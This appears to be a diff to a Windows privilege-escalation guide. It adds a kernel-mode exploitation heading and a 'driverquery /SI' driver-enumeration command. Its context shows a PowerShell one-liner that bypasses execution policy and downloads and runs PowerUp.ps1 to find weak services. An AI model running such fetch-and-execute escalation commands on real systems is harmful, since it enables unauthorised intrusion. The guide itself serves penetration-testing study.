@@ -217,12 +217,22 @@ this is the section where "shit gets real"
 If you have no powershell skip the first part of this section and go to the manual way
 if you do, you're in a bit of luck to automate this using PowerSploit > PrivEsc > PowerUp
 
+
 ## Spot the weak service using PowerSploit's PowerUP
 Usage and details of this script can be found [here](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
 
     powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
 
 
+
+# Kernel-mode exploitation
+Identifying and exploiting vulnerabilities in kernel mode code (the kernel itself and device drivers).
+
+
+## Enumerating third-party drivers
+List of device drivers in the system, including vendor information:
+
+    driverquery /SI
 
 -----
 
